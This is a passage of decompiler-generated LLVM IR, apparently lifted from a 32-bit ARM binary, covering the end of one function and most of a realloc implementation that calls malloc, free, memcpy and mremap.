  %v2_12f58 = add i32 %v1_12f58, 16
  %v3_12f58 = inttoptr i32 %v2_12f58 to i32*
  store i32 0, i32* %v3_12f58, align 4
  %tmp8 = icmp ult i32 %v0_12f50, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12f60

dec_label_pc_12f60:                               ; preds = %dec_label_pc_12f50
  %v0_12f60 = load i32, i32* %ip.global-to-local, align 4
  %v7_12f60 = icmp eq i32 %v0_12f60, 9
  %v1_12f64 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f64 = add i32 %v1_12f64, 20
  %v3_12f64 = inttoptr i32 %v2_12f64 to i32*
  store i32 0, i32* %v3_12f64, align 4
  %v1_12f68 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f68 = add i32 %v1_12f68, 24
  %v3_12f68 = inttoptr i32 %v2_12f68 to i32*
  store i32 0, i32* %v3_12f68, align 4
  br i1 %v7_12f60, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12f60
  %v2_12f6c = load i32, i32* %r4.global-to-local, align 4
  %v3_12f6c = add i32 %v2_12f6c, 32
  %v4_12f6c = inttoptr i32 %v3_12f6c to i32*
  store i32 0, i32* %v4_12f6c, align 4
  %v2_12f70 = load i32, i32* %r4.global-to-local, align 4
  %v3_12f70 = add i32 %v2_12f70, 28
  %v4_12f70 = inttoptr i32 %v3_12f70 to i32*
  store i32 0, i32* %v4_12f70, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12f60, %dec_label_pc_12f14, %dec_label_pc_12f50, %dec_label_pc_12f3c, %dec_label_pc_12ec8, %dec_label_pc_12f34, %bb
  store i32 1, i32* @r1, align 4
  %v0_12f80 = load i32, i32* @r5, align 4
  %v2_12f80 = add i32 %v0_12f80, 44
  %v3_12f80 = inttoptr i32 %v2_12f80 to i32*
  %v4_12f80 = load i32, i32* %v3_12f80, align 4
  store i32 %v4_12f80, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12f80)
  br label %dec_label_pc_12f8c

dec_label_pc_12f8c:                               ; preds = %dec_label_pc_12eac, %.thread
  %v0_12f8c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12e78, i32* @r4, align 4
  store i32 %v6_12e78, i32* @r5, align 4
  store i32 %v9_12e78, i32* @r6, align 4
  store i32 %v12_12e78, i32* @lr, align 4
  ret i32 %v0_12f8c

; uselistorder directives
  uselistorder i32 %v1_12f24, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_12f08, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12f8c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12fb8 = load i32, i32* @r4, align 4
  %v6_12fb8 = load i32, i32* @r5, align 4
  %v9_12fb8 = load i32, i32* @r6, align 4
  %v12_12fb8 = load i32, i32* @r7, align 4
  %v15_12fb8 = load i32, i32* @r8, align 4
  %v18_12fb8 = load i32, i32* @sb, align 4
  %v21_12fb8 = load i32, i32* @sl, align 4
  %v24_12fb8 = load i32, i32* @fp, align 4
  %v27_12fb8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12fc4 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12fc4, label %dec_label_pc_12fd8, label %dec_label_pc_12fe8

dec_label_pc_12fd8:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_12fdc = call i32 @malloc()
  store i32 %v0_12fdc, i32* %r0.global-to-local, align 4
  store i32 %v0_12fdc, i32* @r4, align 4
  br label %dec_label_pc_13348

dec_label_pc_12fe8:                               ; preds = %entry
  %v2_12fe8 = icmp eq i32 %arg2, 0
  br i1 %v2_12fe8, label %dec_label_pc_12ff0, label %dec_label_pc_12ffc

dec_label_pc_12ff0:                               ; preds = %dec_label_pc_12fe8
  %v0_12ff0 = call i32 @free()
  store i32 %v0_12ff0, i32* %r0.global-to-local, align 4
  %v0_12ff4 = load i32, i32* @r6, align 4
  store i32 %v0_12ff4, i32* @r4, align 4
  br label %dec_label_pc_13348

dec_label_pc_12ffc:                               ; preds = %dec_label_pc_12fe8
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_13004 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 108) to i32*), align 4
  store i32 %v4_13004, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_13004, i32* %r2.global-to-local, align 4
  %v4_13010 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 68) to i32*), align 4
  store i32 %v4_13010, i32* %r1.global-to-local, align 4
  %v2_13014 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13014, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_1301c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1301c)
  %v0_13028 = load i32, i32* @r4, align 4
  store i32 %v0_13028, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r1.global-to-local, align 4
  %v4_13034 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_13040.470 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13034)
  %v0_13040 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_13040, -32
  br i1 %tmp36, label %dec_label_pc_13064, label %dec_label_pc_13048

dec_label_pc_13048:                               ; preds = %dec_label_pc_12ffc
  store i32 62012, i32* %r2.global-to-local, align 4
  %v0_1304c = call i32 @__aeabi_read_tp()
  store i32 %v0_1304c, i32* %r0.global-to-local, align 4
  %v3_13050 = load i16, i16* @global_var_22294.357, align 2
  %v4_13050 = sext i16 %v3_13050 to i32
  store i32 %v4_13050, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_1305c = add i32 %v4_13050, %v0_1304c
  %v4_1305c = inttoptr i32 %v3_1305c to i32*
  store i32 12, i32* %v4_1305c, align 4
  br label %dec_label_pc_13348

dec_label_pc_13064:                               ; preds = %dec_label_pc_12ffc
  %v1_13064 = add i32 %v0_13040, 11
  store i32 %v1_13064, i32* %r0.global-to-local, align 4
  %v0_13068 = load i32, i32* @r5, align 4
  %v1_13068 = add i32 %v0_13068, -4
  %v2_13068 = inttoptr i32 %v1_13068 to i32*
  %v3_13068 = load i32, i32* %v2_13068, align 4
  store i32 %v3_13068, i32* %r2.global-to-local, align 4
  %v2_1306c = icmp ugt i32 %v1_13064, 14
  %v7_1306c = icmp eq i32 %v1_13064, 15
  %v2_13070 = xor i1 %v2_1306c, true
  %v3_13070 = or i1 %v7_1306c, %v2_13070
  br i1 %v3_13070, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13064
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13064, %bb
  %v2_13074 = xor i1 %v7_1306c, true
  %v3_13074 = and i1 %v2_1306c, %v2_13074
  br i1 %v3_13074, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13074 = and i32 %v1_13064, -8
  store i32 %v5_13074, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_13078 = and i32 %v3_13068, 2
  %v2_13078 = icmp eq i32 %v1_13078, 0
  %v1_1307c = add i32 %v0_13068, -8
  store i32 %v1_1307c, i32* @sl, align 4
  %v1_13080 = and i32 %v3_13068, -4
  store i32 %v1_13080, i32* @r6, align 4
  br i1 %v2_13078, label %dec_label_pc_13088, label %dec_label_pc_13260

dec_label_pc_13088:                               ; preds = %bb29
  %v1_13088 = load i32, i32* @sb, align 4
  %v3_13088 = icmp ult i32 %v1_13080, %v1_13088
  br i1 %v3_13088, label %dec_label_pc_13094, label %bb30

bb30:                                             ; preds = %dec_label_pc_13088
  store i32 %v1_13080, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131f8

dec_label_pc_13094:                               ; preds = %dec_label_pc_13088
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1309c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_1309c, i32* %r0.global-to-local, align 4
  %v1_130a0 = add i32 %v4_1309c, 44
  %v2_130a0 = inttoptr i32 %v1_130a0 to i32*
  %v3_130a0 = load i32, i32* %v2_130a0, align 4
  store i32 %v3_130a0, i32* %r3.global-to-local, align 4
  %v2_130a4 = add i32 %v1_13080, %v1_1307c
  store i32 %v2_130a4, i32* @r4, align 4
  %v9_130a8 = icmp eq i32 %v2_130a4, %v3_130a0
  %v1_130ac = add i32 %v2_130a4, 4
  %v2_130ac = inttoptr i32 %v1_130ac to i32*
  %v3_130ac = load i32, i32* %v2_130ac, align 4
  store i32 %v3_130ac, i32* %r1.global-to-local, align 4
  br i1 %v9_130a8, label %dec_label_pc_130b4, label %dec_label_pc_130f0

dec_label_pc_130b4:                               ; preds = %dec_label_pc_13094
  %v1_130b4 = and i32 %v3_130ac, -4
  %v2_130b8 = add i32 %v1_130b4, %v1_13080
  store i32 %v2_130b8, i32* %r1.global-to-local, align 4
  %v1_130bc = add i32 %v1_13088, 16
  store i32 %v1_130bc, i32* %r3.global-to-local, align 4
  %v3_130c0 = icmp ult i32 %v2_130b8, %v1_130bc
  br i1 %v3_130c0, label %dec_label_pc_13144, label %dec_label_pc_130c8

dec_label_pc_130c8:                               ; preds = %dec_label_pc_130b4
  %v2_130c8 = sub i32 %v2_130b8, %v1_13088
  %v1_130cc = urem i32 %v3_13068, 2
  %v2_130d0 = add i32 %v1_13088, %v1_1307c
  store i32 %v2_130d0, i32* %r1.global-to-local, align 4
  %v2_130d4 = or i32 %v1_13088, %v1_130cc
  store i32 %v2_130d4, i32* %r2.global-to-local, align 4
  %v1_130d8 = or i32 %v2_130c8, 1
  store i32 %v1_130d8, i32* %r3.global-to-local, align 4
  store i32 %v0_13068, i32* @r4, align 4
  store i32 %v2_130d4, i32* %v2_13068, align 4
  %v0_130e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_130e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_130e4 = add i32 %v1_130e4, 44
  %v3_130e4 = inttoptr i32 %v2_130e4 to i32*
  store i32 %v0_130e4, i32* %v3_130e4, align 4
  %v0_130e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_130e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_130e8 = add i32 %v1_130e8, 4
  %v3_130e8 = inttoptr i32 %v2_130e8 to i32*
  store i32 %v0_130e8, i32* %v3_130e8, align 4
  br label %dec_label_pc_1332c

dec_label_pc_130f0:                               ; preds = %dec_label_pc_13094
  %v1_130f0 = and i32 %v3_130ac, -2
  %v2_130f4 = add i32 %v1_130f0, %v2_130a4
  store i32 %v2_130f4, i32* %r3.global-to-local, align 4
  %v1_130f8 = add i32 %v2_130f4, 4
  %v2_130f8 = inttoptr i32 %v1_130f8 to i32*
  %v3_130f8 = load i32, i32* %v2_130f8, align 4
  store i32 %v3_130f8, i32* %r3.global-to-local, align 4
  %v1_130fc = urem i32 %v3_130f8, 2
  %v2_130fc = icmp eq i32 %v1_130fc, 0
  br i1 %v2_130fc, label %dec_label_pc_13104, label %dec_label_pc_13144

dec_label_pc_13104:                               ; preds = %dec_label_pc_130f0
  %v1_13104 = and i32 %v3_130ac, -4
  store i32 %v1_13104, i32* %r3.global-to-local, align 4
  %v2_13108 = add i32 %v1_13104, %v1_13080
  store i32 %v2_13108, i32* %r0.global-to-local, align 4
  %v3_1310c = icmp ult i32 %v2_13108, %v1_13088
  br i1 %v3_1310c, label %dec_label_pc_13144, label %dec_label_pc_13114

dec_label_pc_13114:                               ; preds = %dec_label_pc_13104
  %v1_13114 = add i32 %v1_13080, %v0_13068
  %v2_13114 = inttoptr i32 %v1_13114 to i32*
  %v3_13114 = load i32, i32* %v2_13114, align 4
  store i32 %v3_13114, i32* %r1.global-to-local, align 4
  %v1_13118 = add i32 %v3_13114, 12
  %v2_13118 = inttoptr i32 %v1_13118 to i32*
  %v3_13118 = load i32, i32* %v2_13118, align 4
  store i32 %v3_13118, i32* %r3.global-to-local, align 4
  %v9_1311c = icmp eq i32 %v3_13118, %v2_130a4
  %v1_13120 = add i32 %v2_130a4, 12
  %v2_13120 = inttoptr i32 %v1_13120 to i32*
  %v3_13120 = load i32, i32* %v2_13120, align 4
  store i32 %v3_13120, i32* %r2.global-to-local, align 4
  br i1 %v9_1311c, label %dec_label_pc_13128, label %dec_label_pc_13134

dec_label_pc_13128:                               ; preds = %dec_label_pc_13114
  %v1_13128 = add i32 %v3_13120, 8
  %v2_13128 = inttoptr i32 %v1_13128 to i32*
  %v3_13128 = load i32, i32* %v2_13128, align 4
  store i32 %v3_13128, i32* %r3.global-to-local, align 4
  %v9_1312c = icmp eq i32 %v3_13128, %v2_130a4
  br i1 %v9_1312c, label %dec_label_pc_13138, label %dec_label_pc_13134

dec_label_pc_13134:                               ; preds = %dec_label_pc_13114, %dec_label_pc_13128
  %v0_13134 = call i32 @abort()
  store i32 %v0_13134, i32* %r0.global-to-local, align 4
  %v0_13138.pre = load i32, i32* @r1, align 4
  %v1_13138.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13138

dec_label_pc_13138:                               ; preds = %dec_label_pc_13128, %dec_label_pc_13134
  %v1_13138 = phi i32 [ %v3_13120, %dec_label_pc_13128 ], [ %v1_13138.pre, %dec_label_pc_13134 ]
  %v0_13138 = phi i32 [ %v3_13114, %dec_label_pc_13128 ], [ %v0_13138.pre, %dec_label_pc_13134 ]
  %v2_13138 = add i32 %v1_13138, 8
  %v3_13138 = inttoptr i32 %v2_13138 to i32*
  store i32 %v0_13138, i32* %v3_13138, align 4
  %v0_1313c = load i32, i32* %r2.global-to-local, align 4
  %v1_1313c = load i32, i32* %r1.global-to-local, align 4
  %v2_1313c = add i32 %v1_1313c, 12
  %v3_1313c = inttoptr i32 %v2_1313c to i32*
  store i32 %v0_1313c, i32* %v3_1313c, align 4
  %v1_131f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131f8

dec_label_pc_13144:                               ; preds = %dec_label_pc_130b4, %dec_label_pc_13104, %dec_label_pc_130f0
  %v1_13144 = add i32 %v1_13088, -7
  store i32 %v1_13144, i32* @r0, align 4
  %v0_13148 = call i32 @malloc()
  store i32 %v0_13148, i32* @r0, align 4
  store i32 %v0_13148, i32* %r1.global-to-local, align 4
  %v2_1314c = icmp eq i32 %v0_13148, 0
  br i1 %v2_1314c, label %bb31, label %dec_label_pc_13158

bb31:                                             ; preds = %dec_label_pc_13144
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1332c

dec_label_pc_13158:                               ; preds = %dec_label_pc_13144
  %v1_13160.pre = load i32, i32* @r4, align 4
  %v1_13158 = add i32 %v0_13148, -4
  %v2_13158 = inttoptr i32 %v1_13158 to i32*
  %v3_13158 = load i32, i32* %v2_13158, align 4
  store i32 %v3_13158, i32* @r3, align 4
  %v1_1315c = add i32 %v0_13148, -8
  store i32 %v1_1315c, i32* @r7, align 4
  %v9_13160 = icmp eq i32 %v1_1315c, %v1_13160.pre
  br i1 %v9_13160, label %.thread2, label %dec_label_pc_13170

.thread2:                                         ; preds = %dec_label_pc_13158
  %v2_13164 = and i32 %v3_13158, -4
  store i32 %v2_13164, i32* %r3.global-to-local, align 4
  %v2_13168 = load i32, i32* @r6, align 4
  %v3_13168 = add i32 %v2_13168, %v2_13164
  store i32 %v3_13168, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131f8

dec_label_pc_13170:                               ; preds = %dec_label_pc_13158
  %v0_13170 = load i32, i32* @r6, align 4
  %v1_13170 = add i32 %v0_13170, -4
  store i32 %v1_13170, i32* @r2, align 4
  %v3_13174 = udiv i32 %v1_13170, 4
  store i32 %v3_13174, i32* @ip, align 4
  %tmp37 = and i32 %v1_13170, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1317c = icmp ult i32 %v1_13170, 36
  %v3_1317c = or i1 %tmp38, %v2_1317c
  %v0_1318c = load i32, i32* @r5, align 4
  br i1 %v3_1317c, label %dec_label_pc_1318c, label %dec_label_pc_13180

dec_label_pc_13180:                               ; preds = %dec_label_pc_13170
  store i32 %v0_1318c, i32* @r1, align 4
  %v0_13184 = call i32 @memcpy()
  store i32 %v0_13184, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1318c:                               ; preds = %dec_label_pc_13170
  %v1_1318c = inttoptr i32 %v0_1318c to i32*
  %v2_1318c = load i32, i32* %v1_1318c, align 4
  store i32 %v2_1318c, i32* %r3.global-to-local, align 4
  %v2_13190 = inttoptr i32 %v0_13148 to i32*
  store i32 %v2_1318c, i32* %v2_13190, align 4
  %v0_13194 = load i32, i32* @r5, align 4
  %v1_13194 = add i32 %v0_13194, 4
  %v2_13194 = inttoptr i32 %v1_13194 to i32*
  %v3_13194 = load i32, i32* %v2_13194, align 4
  store i32 %v3_13194, i32* %r3.global-to-local, align 4
  %v1_13198 = load i32, i32* %r1.global-to-local, align 4
  %v2_13198 = add i32 %v1_13198, 4
  %v3_13198 = inttoptr i32 %v2_13198 to i32*
  store i32 %v3_13194, i32* %v3_13198, align 4
  %v0_1319c = load i32, i32* @r5, align 4
  %v1_1319c = add i32 %v0_1319c, 8
  %v2_1319c = inttoptr i32 %v1_1319c to i32*
  %v3_1319c = load i32, i32* %v2_1319c, align 4
  store i32 %v3_1319c, i32* %r3.global-to-local, align 4
  %v0_131a0 = load i32, i32* @ip, align 4
  %v1_131a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_131a4 = add i32 %v1_131a4, 8
  %v3_131a4 = inttoptr i32 %v2_131a4 to i32*
  store i32 %v3_1319c, i32* %v3_131a4, align 4
  %tmp39 = icmp ult i32 %v0_131a0, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_131ac

dec_label_pc_131ac:                               ; preds = %dec_label_pc_1318c
  %v0_131ac = load i32, i32* @r5, align 4
  %v1_131ac = add i32 %v0_131ac, 12
  %v2_131ac = inttoptr i32 %v1_131ac to i32*
  %v3_131ac = load i32, i32* %v2_131ac, align 4
  store i32 %v3_131ac, i32* %r3.global-to-local, align 4
  %v1_131b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_131b0 = add i32 %v1_131b0, 12
  %v3_131b0 = inttoptr i32 %v2_131b0 to i32*
  store i32 %v3_131ac, i32* %v3_131b0, align 4
  %v0_131b4 = load i32, i32* @r5, align 4
  %v1_131b4 = add i32 %v0_131b4, 16
  %v2_131b4 = inttoptr i32 %v1_131b4 to i32*
  %v3_131b4 = load i32, i32* %v2_131b4, align 4
  store i32 %v3_131b4, i32* %r3.global-to-local, align 4
  %v0_131b8 = load i32, i32* @ip, align 4
  %v1_131bc = load i32, i32* %r1.global-to-local, align 4
  %v2_131bc = add i32 %v1_131bc, 16
  %v3_131bc = inttoptr i32 %v2_131bc to i32*
  store i32 %v3_131b4, i32* %v3_131bc, align 4
  %tmp40 = icmp ult i32 %v0_131b8, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_131c4

dec_label_pc_131c4:                               ; preds = %dec_label_pc_131ac
  %v0_131c4 = load i32, i32* @r5, align 4
  %v1_131c4 = add i32 %v0_131c4, 20
  %v2_131c4 = inttoptr i32 %v1_131c4 to i32*
  %v3_131c4 = load i32, i32* %v2_131c4, align 4
  store i32 %v3_131c4, i32* %r3.global-to-local, align 4
  %v1_131c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_131c8 = add i32 %v1_131c8, 20
  %v3_131c8 = inttoptr i32 %v2_131c8 to i32*
  store i32 %v3_131c4, i32* %v3_131c8, align 4
  %v0_131cc = load i32, i32* @r5, align 4
  %v1_131cc = add i32 %v0_131cc, 24
  %v2_131cc = inttoptr i32 %v1_131cc to i32*
  %v3_131cc = load i32, i32* %v2_131cc, align 4
  store i32 %v3_131cc, i32* %r3.global-to-local, align 4
  %v1_131d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_131d0 = add i32 %v1_131d0, 24
  %v3_131d0 = inttoptr i32 %v2_131d0 to i32*
  store i32 %v3_131cc, i32* %v3_131d0, align 4
  %v0_131d4 = load i32, i32* @ip, align 4
  %v7_131d4 = icmp eq i32 %v0_131d4, 9
  br i1 %v7_131d4, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_131c4
  %v1_131d8 = load i32, i32* @r5, align 4
  %v2_131d8 = add i32 %v1_131d8, 28
  %v3_131d8 = inttoptr i32 %v2_131d8 to i32*
  %v4_131d8 = load i32, i32* %v3_131d8, align 4
  store i32 %v4_131d8, i32* %r3.global-to-local, align 4
  %v2_131dc = load i32, i32* %r1.global-to-local, align 4
  %v3_131dc = add i32 %v2_131dc, 28
  %v4_131dc = inttoptr i32 %v3_131dc to i32*
  store i32 %v4_131d8, i32* %v4_131dc, align 4
  %v1_131e0 = load i32, i32* @r5, align 4
  %v2_131e0 = add i32 %v1_131e0, 32
  %v3_131e0 = inttoptr i32 %v2_131e0 to i32*
  %v4_131e0 = load i32, i32* %v3_131e0, align 4
  store i32 %v4_131e0, i32* %r3.global-to-local, align 4
  %v2_131e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_131e4 = add i32 %v2_131e4, 32
  %v4_131e4 = inttoptr i32 %v3_131e4 to i32*
  store i32 %v4_131e0, i32* %v4_131e4, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_131c4, %dec_label_pc_131ac, %dec_label_pc_1318c, %dec_label_pc_13180, %bb32
  %v0_131e8 = load i32, i32* @r5, align 4
  store i32 %v0_131e8, i32* @r0, align 4
  %v0_131ec = call i32 @free()
  store i32 %v0_131ec, i32* %r0.global-to-local, align 4
  %v0_131f0 = load i32, i32* @r7, align 4
  %v1_131f0 = add i32 %v0_131f0, 8
  store i32 %v1_131f0, i32* @r4, align 4
  br label %dec_label_pc_1332c

dec_label_pc_131f8:                               ; preds = %bb30, %.thread2, %dec_label_pc_13138
  %v0_1320c = phi i32 [ %v3_13168, %.thread2 ], [ %v1_13080, %bb30 ], [ %v1_131f8.pre, %dec_label_pc_13138 ]
  %v0_131f8 = load i32, i32* @sb, align 4
  %v2_131f8 = sub i32 %v0_1320c, %v0_131f8
  store i32 %v2_131f8, i32* %r1.global-to-local, align 4
  %v0_13200 = load i32, i32* @sl, align 4
  %v1_13200 = add i32 %v0_13200, 4
  %v2_13200 = inttoptr i32 %v1_13200 to i32*
  %v3_13200 = load i32, i32* %v2_13200, align 4
  %tmp41 = icmp ugt i32 %v2_131f8, 15
  %v1_13228 = urem i32 %v3_13200, 2
  store i32 %v1_13228, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_13228, label %dec_label_pc_13208

dec_label_pc_13208:                               ; preds = %dec_label_pc_131f8
  %v2_1320c = or i32 %v1_13228, %v0_1320c
  store i32 %v2_1320c, i32* %r3.global-to-local, align 4
  store i32 %v2_1320c, i32* %v2_13200, align 4
  %v0_13214 = load i32, i32* @sl, align 4
  %v1_13214 = load i32, i32* %r0.global-to-local, align 4
  %v2_13214 = add i32 %v1_13214, %v0_13214
  store i32 %v2_13214, i32* %r2.global-to-local, align 4
  %v1_13218 = add i32 %v2_13214, 4
  %v2_13218 = inttoptr i32 %v1_13218 to i32*
  %v3_13218 = load i32, i32* %v2_13218, align 4
  %v1_1321c = or i32 %v3_13218, 1
  store i32 %v1_1321c, i32* %r3.global-to-local, align 4
  store i32 %v1_1321c, i32* %v2_13218, align 4
  br label %dec_label_pc_13258

dec_label_pc_13228:                               ; preds = %dec_label_pc_131f8
  %v2_1322c = add i32 %v0_13200, %v0_131f8
  store i32 %v2_1322c, i32* %r0.global-to-local, align 4
  %v2_13230 = or i32 %v1_13228, %v0_131f8
  store i32 %v2_13230, i32* %r3.global-to-local, align 4
  %v1_13234 = or i32 %v2_131f8, 1
  store i32 %v1_13234, i32* %r2.global-to-local, align 4
  store i32 %v2_13230, i32* %v2_13200, align 4
  %v0_1323c = load i32, i32* %r2.global-to-local, align 4
  %v1_1323c = load i32, i32* %r0.global-to-local, align 4
  %v2_1323c = add i32 %v1_1323c, 4
  %v3_1323c = inttoptr i32 %v2_1323c to i32*
  store i32 %v0_1323c, i32* %v3_1323c, align 4
  %v0_13240 = load i32, i32* %r0.global-to-local, align 4
  %v1_13240 = load i32, i32* %r1.global-to-local, align 4
  %v2_13240 = add i32 %v1_13240, %v0_13240
  store i32 %v2_13240, i32* %r2.global-to-local, align 4
  %v1_13244 = add i32 %v2_13240, 4
  %v2_13244 = inttoptr i32 %v1_13244 to i32*
  %v3_13244 = load i32, i32* %v2_13244, align 4
  %v1_13248 = or i32 %v3_13244, 1
  store i32 %v1_13248, i32* %r3.global-to-local, align 4
  store i32 %v1_13248, i32* %v2_13244, align 4
  %v0_13250 = load i32, i32* %r0.global-to-local, align 4
  %v1_13250 = add i32 %v0_13250, 8
  store i32 %v1_13250, i32* @r0, align 4
  %v0_13254 = call i32 @free()
  store i32 %v0_13254, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13258

dec_label_pc_13258:                               ; preds = %dec_label_pc_13208, %dec_label_pc_13228
  %v0_13258 = load i32, i32* @sl, align 4
  %v1_13258 = add i32 %v0_13258, 8
  store i32 %v1_13258, i32* @r4, align 4
  br label %dec_label_pc_1332c

dec_label_pc_13260:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r1.global-to-local, align 4
  %v4_13268 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_13268, i32* @r8, align 4
  %v2_1326c = inttoptr i32 %v1_1307c to i32*
  %v3_1326c = load i32, i32* %v2_1326c, align 4
  store i32 %v3_1326c, i32* @r4, align 4
  %v1_13270 = add i32 %v4_13268, 860
  %v2_13270 = inttoptr i32 %v1_13270 to i32*
  %v3_13270 = load i32, i32* %v2_13270, align 4
  %v1_13274 = add i32 %v3_1326c, 4
  %v1_13278 = add i32 %v3_13270, -1
  store i32 %v1_13278, i32* %r2.global-to-local, align 4
  %v2_1327c = add i32 %v1_13274, %v1_13278
  %v1_13280 = load i32, i32* @sb, align 4
  %v2_13280 = add i32 %v2_1327c, %v1_13280
  store i32 %v2_13280, i32* %r3.global-to-local, align 4
  %v2_13284 = sub i32 0, %v3_13270
  %v3_13284 = and i32 %v2_13280, %v2_13284
  store i32 %v3_13284, i32* @r7, align 4
  %v2_13288 = sub i32 %v3_13284, %v3_1326c
  store i32 %v2_13288, i32* @fp, align 4
  %v9_1328c = icmp eq i32 %v1_13080, %v2_13288
  br i1 %v9_1328c, label %dec_label_pc_13300, label %dec_label_pc_13294

dec_label_pc_13294:                               ; preds = %dec_label_pc_13260
  %v2_13294 = sub i32 %v1_1307c, %v3_1326c
  store i32 %v2_13294, i32* %r0.global-to-local, align 4
  %v2_13298 = add i32 %v3_1326c, %v1_13080
  store i32 %v2_13298, i32* %r1.global-to-local, align 4
  store i32 %v3_13284, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_132a4 = call i32 @mremap(i32 %v2_13294, i32 %v2_13298, i32 %v3_13284, i32 1)
  store i32 %v4_132a4, i32* %r0.global-to-local, align 4
  %v7_132a8 = icmp eq i32 %v4_132a4, -1
  br i1 %v7_132a8, label %dec_label_pc_132f4, label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %dec_label_pc_13294
  %v1_132b0 = load i32, i32* @r4, align 4
  %v2_132b0 = add i32 %v1_132b0, %v4_132a4
  store i32 %v2_132b0, i32* %r0.global-to-local, align 4
  %v0_132b4 = load i32, i32* @fp, align 4
  %v1_132b4 = or i32 %v0_132b4, 2
  store i32 %v1_132b4, i32* %r3.global-to-local, align 4
  %v2_132b8 = add i32 %v2_132b0, 4
  %v3_132b8 = inttoptr i32 %v2_132b8 to i32*
  store i32 %v1_132b4, i32* %v3_132b8, align 4
  %v0_132bc = load i32, i32* @r8, align 4
  %v1_132bc = add i32 %v0_132bc, 868
  %v2_132bc = inttoptr i32 %v1_132bc to i32*
  %v3_132bc = load i32, i32* %v2_132bc, align 4
  store i32 %v3_132bc, i32* %r3.global-to-local, align 4
  %v1_132c0 = add i32 %v0_132bc, 880
  %v2_132c0 = inttoptr i32 %v1_132c0 to i32*
  %v3_132c0 = load i32, i32* %v2_132c0, align 4
